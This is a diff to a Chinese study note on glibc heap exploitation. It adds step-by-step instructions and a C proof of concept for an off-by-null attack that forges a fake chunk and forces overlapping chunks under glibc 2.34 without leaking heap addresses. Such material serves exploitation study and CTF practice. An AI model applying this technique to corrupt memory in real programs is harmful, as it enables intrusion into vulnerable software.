@@ -118,3 +118,105 @@ if (__glibc_unlikely (chunksize(p) != prevsize))
 ##### 不可泄漏堆地址
 
 比较麻烦，有两种办法爆破的和不爆破的，他俩的根本区别在于利用时合并的方向，爆破法总是后向合并（前一个块和当前块合并，也就是向低地址合并），非爆破法则是前向合并（当前块和后一个块合并，也就是向高地址合并）
+
+大致利用方式如下：
+
+* 先后释放`FD`、`chunk2`、`BK2`，在`chunk2`中踩出`fd`和`bk`指针
+* 释放`chunk1`，使得`chunk1`和`chunk2`合并并重新分配二者的`size`，让`chunk1`包含之前`chunk2`的`size`和`fd`及`bk`
+* 之前的`chunk2`现在称为`fake chunk`。修改`fake chunk`的`size`，恢复`FD`和`BK`
+* 先后释放`FD`和`chunk2`到`unsortedbin`，使得`FD's bk = chunk2`。部分修改`FD`的`bk`，使得`FD's bk = fake chunk`
+* 恢复`FD`和`chunk2`，现在`fake_chunk -> fd -> bk == fake_chunk`
+* 先后释放`chunk2`和`BK2`并释放`BK1`。重新分配合并的`BK`，使得可以部分修改原本`BK2`的`fd`，使得`BK's fd = fake chunk`
+* 恢复`BK`和`chunk2`，现在满足`fake_chunk -> bk -> fd == fake_chunk`
+* 释放`victim(gap3)`并重新申请回来，写`BK1`的`prev_size`和`prev_inuse`
+* 释放`BK1`，导致`fake chunk`、`victim`、`BK1`合并，获得重叠指针
+
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <assert.h>
+
+void init(){
+    setbuf(stdin, 0);
+    setbuf(stdout, 0);
+    setbuf(stderr, 0);
+}
+
+// 基于glibc2.34
+// 本POC旨在展示一种更为通用的情况，即回车不会被替换为\x00，这意味着至少倒数第二字节会被覆盖为\x00
+int main(){
+    init();
+    // 先构造堆块如下，注意需要让利用堆块2的地址对齐0x100。
+    // 例如在glibc2.34下，tcache_perthread_struct的大小为0x100，利用堆块2的地址刚好为0x??c00
+    size_t* gap1 = malloc(0x10); // gap1
+    size_t* FD = malloc(0x420); // FD
+    size_t* gap2 = malloc(0x90); // gap2
+    size_t* chunk1 = malloc(0x470); // 利用堆块1
+    size_t* chunk2 = malloc(0x470); // 利用堆块2
+    size_t* gap3 = malloc(0x10); // gap3 (victim)
+    size_t* BK1 = malloc(0x410); // BK1
+    size_t* BK2 = malloc(0x410); // BK2
+    size_t* gap4 = malloc(0x10); // gap4
+
+    // 第一步：先后释放FD、利用堆块2、BK到unsortedbin
+    // 目的是在利用堆块2中踩出fd和bk指针
+    free(FD);
+    free(chunk2);
+    free(BK2);
+
+    // 第二步：释放利用堆块1，使得两个利用堆块合并，从而重新分配二者的size
+    // 会被添加到unsortedbin末尾
+    free(chunk1);
+
+    // 第三步：重新分配两个利用堆块的size，使得可以操纵之前chunk的size
+    // 意味着最开始的chunk2成为了现在的fake chunk
+    chunk1 = malloc(0x498);
+    chunk2 = malloc(0x458);
+
+    chunk2[-5] = 0x4a1; // fake chunk's size
+
+    // 第四步：恢复FD和BK
+    FD = malloc(0x420); // FD
+    BK2 = malloc(0x410); // BK
+
+        // 第五步：满足fake_chunk->fd->bk = fake_chunk
+    // 先将chunk2和FD_释放到unsortedbin，踩出FD_的bk
+    free(FD);
+    free(chunk2);
+    // 再申请回来，同时部分写其bk指针使其满足fake_chunk->fd->bk = fake_chunk
+    FD = malloc(0x420);
+    chunk2 = malloc(0x458);
+    *((char*)FD + 8) = 0;
+
+        // 第六步：满足fake_chunk->bk->fd = fake_chunk
+    // 由于最低覆写倒数第二字节为0，因此需要合并两个BK再重新分配size
+    free(chunk2);
+    free(BK2);
+    free(BK1);
+
+    // 申请回chunk2
+    chunk2 = malloc(0x458);
+
+    // 重新分配BK1和BK2的size
+    BK1 = malloc(0x4f0);
+    BK2 = malloc(0x330);
+
+    // 通过BK1来写之前的BK2的fd
+    *((char*)BK1 + 0x420) = 0;
+
+    // 第七步：通过gap3(victim)来off by null同时写prev_size
+    free(gap3);
+    gap3 = malloc(0x18);
+    gap3[2] = 0x4a0; // prev_size
+    *((char*)gap3 + 0x18) = 0; 
+
+    // 第八步：释放BK1，触发off by null漏洞，将chunk2、gap3(victim)、BK1合并
+    printf("Before free, the fake chunk's size is 0x%lx.\n", chunk2[-5]);
+    free(BK1);
+    printf("After free, the fake chunk's size has been 0x%lx, proves that the three chunks have been merged.\n", chunk2[-5]);
+    assert(chunk2[-5] == 0x9a1);    
+}
+```
+
+抄的晚秋的。
